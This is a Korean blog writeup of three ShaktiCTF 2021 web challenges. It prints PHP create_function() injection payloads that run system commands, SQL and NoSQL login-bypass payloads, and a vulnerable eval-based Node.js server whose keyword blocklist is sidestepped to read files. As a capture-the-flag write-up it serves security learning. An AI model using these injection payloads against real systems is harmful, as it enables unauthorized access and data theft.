---
layout: post
title:  "ShaktiCTF 2021 Writeup"
tags: [ShaktiCTF,CTF-2021,CTF]
excerpt: "ShaktiCTF 2021 Writeup"
---

## Magic

```
+ Description
  + I found creating new functionalities as magic. So I went and created quite a few, now I don't remember what is what. help me remember them :( !

+ Link
  + http://35.238.173.184/

+ Created By
  + Gopika
```

+ #### 문제 분석

    ![Magic Home Page](/post-images/ShaktiCTF/2021/WEB/Magic/HomePage.png)

    링크에 들어가면 Login 버튼과 함께 텍스트가 나오게됩니다.

    + #### 페이지 기능

        + ##### Login

            ![Login Page](/post-images/ShaktiCTF/2021/WEB/Magic/Login.png)

            ``login.html``페이지의 Login의 기능은 ``username, password``을 입력받은 다음
            존재하지 않는 유저가 나오면 
            
            ``Invalid credentials`` 라는 메세지가 나오게됩니다.

            로그인을 이용하여 db에 임의의 값을 전송하므로 SQL Injection를 시도해봤지만 어떠한 페이로드를 시도하여도 취약점이 터지지 않았습니다.

        + ##### Chat

            ![Chat](/post-images/ShaktiCTF/2021/WEB/Magic/Create.png)

            ``Chat.html`` 페이지는 어떠한 값을 입력한 다름 Post 버튼을 누르면 데이터가 전송되는것이 아닌 ``Chat.html#`` 으로 URL에 #이 추가되면서 아무런 동작이 없는것을 보고

            아직 미완성인 기능으로 추측됩니다.

            ```html
            <p class="lead">"Create" new friends with chat</p>
                <input type="text" class="form-control" id="c" name="c"  required>
            <p class="lead">
            <a class="btn btn-primary btn-lg" href="#" role="button">Post</a>
            ```

            HTML 소스코드를 살펴보면 ``form`` 태그와 비슷한 동작이 없는것을 확인할 수 있습니다.(입력해도 아무런 동작을 하지 않음)

        + ##### Report

            ![Report](/post-images/ShaktiCTF/2021/WEB/Magic/Report.png)

            ``repoer.html`` 페이지는 어떠한 값을 입력한 다음 버튼을 누르면

            ![Create magic](/post-images/ShaktiCTF/2021/WEB/Magic/Create-Magic.png)

            ``admin.php``으로 이동하면서 새로운 페이지가 나오게됩니다.

            한번 더 아무런 값인 ``test``를 입력해보면

            ```php
            Deprecated: Function create_function() is deprecated in /var/www/html/admin.php on line 23

            Parse error: syntax error, unexpected '}' in /var/www/html/admin.php(23) : runtime-created function on line 1
            ```

            admin.php에서 ``create_function()`` 함수로 인해 에러나는것을 볼 수 있습니다.

+ #### 문제 풀이

    ``login.html`` 페이지를 이용하여 SQL Injection를 시도해보았지만 통하지 않는것을 보고

    ``admin.php``에서 에러에 나오는 ``create_function()``함수와 관련된 
    
    [PHP bug](https://bugs.php.net/bug.php?id=48231) 이와 같은 취약점이 존재하는것을 볼 수 있습니다.

    해당 페이지에 있는 페이로드를 이용하여 ``admin.php``에 ``};phpinfo();//`` 이러한 값을 주입하면

    ![PHP Info](/post-images/ShaktiCTF/2021/WEB/Magic/PHP-info.png)

    이렇게 ``phpinfo();`` 함수가 실행되는것을 볼 수 있습니다.

    해당 취약점을 이용하여 ``phpinfo();`` 함수 대신에 ``system("ls");`` 으로 주입할시에 의도한대로

    ```php
    Deprecated: Function create_function() is deprecated in /var/www/html/admin.php on line 23
    1 12345642312 1998_Dumb_secrets.php 2 Dockerfile a aaa aaaa admin.php asd bil.php c chat.html check.html css flag.html flag.php flag.txt fonts haclabor.txt index.html login.html lol.txt m.php myfile2.txt report.html rules.html s.php swag swag_shell.php t test.php testfile.txt testtest.html zaabi_ta7an.php
    ```

    ``};system("ls");//``

    이러한 에러 메세지가 뜨면서 내부 서버에 접근할 수 있게 됩니다.

    출력된 flag가 들어간 파일중 ``flag.html, flag.php, flag.txt`` 를 읽어보았지만 

    ```php
    <?php
    $flag="shaktictf{fake_flag}";
    ?>
    ```

    이러한 가짜 플래그가 나오는것을 볼 수 있습니다.

    하지만 다른 파일중 ``1998_Dumb_secrets.php``에

    ``};system("cat 1998_Dumb_secrets.php");//``

    ```php
    <?php
        $flag1="shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}";
    ?>
    ```
    
    가짜 플래그가 아닌 제대로된 플래그가 존재하는것을 볼 수 있습니다.

``Flag is shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}``

## Impersonate

```
+ Description
  + Impersonate admin and get his secret code from here

+ Link
  + http://34.71.6.79:4000/
```

+ #### 문제 분석 & 문제 풀이

    링크에 들어가보면

    ![Hoempage](/post-images/ShaktiCTF/2021/WEB/Impersonate/Nologin.png)

    ``username, password``를 입력하는 부분과 텍스트부분이 나오게됩니다.

    해당 기능을 이용하여

    ```sql
    ' or 1=1 -- '
    ' or 1=1 #'
    " or 1=1 -- "
    " or 1=1 #"
    ' or sleep(1000) -- '
    " or 1=1 sleep(1000) -- "
    ' or sleep(10000) #'
    " or sleep(10000) #"
    ...
    ```

    SQL Injection 페이로드를 주입해봤지만

    별 효과가 있지 않았습니다.

    하지만 로그인할때 SQL만 쓰이는것이 아닌 NoSQL이라는것도 있기때문에

    요청을 할때 ``username[$ne]=&password[$ne]=`` 이처럼 NoSQL Injection를 시도하면

    ```
    Hey Administrator you are finally back!!! There were soo many n00bs trying to impersonate you , here's your secret, keep it safe - shaktictf{N0_sql_injection_15_e4sy}
    ```

    이렇게 로그인 우회에 성공하면서 플래그를 얻을 수 있습니다.

``Flag is shaktictf{N0_sql_injection_15_e4sy}``

## Unsafereputation

```
+ Description
  + It takes many good deeds to build a good reputation, and only one bad function to lose it.

+ Link
  + http://35.239.219.201:4000/

+ FILE
  + main.js
```

+ #### 문제분석 & 문제 풀이

    > 해당 문제는 CTF가 끝나자마자 웹 서버가 닫혀서 상세하게 못했습니다.

    해당 문제는 ``main.js``에

    ```js
    var express = require('express');
    var app = express();

    app.get('/', function (req, res) {

      var inp = req.query.text;

      if(inp){
        const blacklist = ['system', 'child_process', 'exec', 'spawn', 'eval'];

        if(blacklist.map(v=>inp.includes(v)).filter(v=>v).length !== 0){
          res.send("That function is blocked, sorry XD");
          return;
        }

        res.send('Welcome to the world ' + eval(inp));
        console.log(req.query.text);
      }else{
        res.send("Hey aren't you missing something??");
        return;
      }
    });

    app.listen(4000, function () {
      console.log('app listening on port 4000!');
    });
    ```

    이러한 소스코드를 사용하는것을 볼 수 있습니다.

    해당 소스코드를 살펴보면

    ```js
    if(blacklist.map(v=>inp.includes(v)).filter(v=>v).length !== 0){
      res.send("That function is blocked, sorry XD");
      return;
    }
    ```

    ``['system', 'child_process', 'exec', 'spawn', 'eval']`` blacklist에 있는 문자열이 하나라도 존재하면 ``That function is blocked, sorry XD``를 반환하고

    만약 존재하지않으면 eval함수에 우리가 입력한 임의의 값이 전송됩니다.

    해당 eval함수는 어떤 언어든 되게 위험한 함수로 잘 알려져 있으므로

    블랙리스트 문자열을 우회하여

    ```js
    require("fs").readdirSync("FILE Name")
    require("fs").readFileSync("FILE Name")
    ```

    node.js에서 fs 모듈의 ``readFileSync`` ``readdirSync`` 해당 함수를 이용하여 내부 서버의 파일에 접근했습니다.

## 후기

이번 CTF는 되게 풀 수 있는것도 있어서 좋았던것같고 문제가 재밌었다.